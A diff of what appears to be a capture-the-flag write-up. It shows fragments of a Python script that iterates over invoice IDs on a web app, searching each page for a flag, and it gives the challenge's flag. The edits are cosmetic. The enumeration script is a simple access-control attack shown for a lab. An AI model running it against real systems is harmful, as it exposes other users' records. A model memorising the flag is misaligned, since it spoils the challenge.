@@ -8,8 +8,7 @@ So then we have to test all the invoices to check in which page we get the "SSS"
 
 //CODE
 
-```
-
+```py
 import requests
 import re
 
@@ -26,7 +25,7 @@ for invoice_id in range(start, end + 1):
     try:
         response = session.get(url, timeout=5)
     except Exception as e:
-        print(f"⛔ Eroare la {url}: {e}")
+        print(f"Eroare la {url}: {e}")
         continue
 
 
@@ -37,7 +36,7 @@ for invoice_id in range(start, end + 1):
     match = re.search(r"SSS\{.*?\}", response.text)
     if match:
         flag = match.group(0)
-        print(f"\n🎯 FLAG la invoice={invoice_id}: {flag}\n")
+        print(f"\nFLAG la invoice={invoice_id}: {flag}\n")
 
 
         with open(f"invoice_{invoice_id}.html", "w", encoding="utf-8") as f:
@@ -45,5 +44,6 @@ for invoice_id in range(start, end + 1):
 
         break
 ```
-The found flag: SSS{1ts_n0t_nic3_t0_sn00p_ar0und}
+
+The found flag: **SSS{1ts_n0t_nic3_t0_sn00p_ar0und}**
 
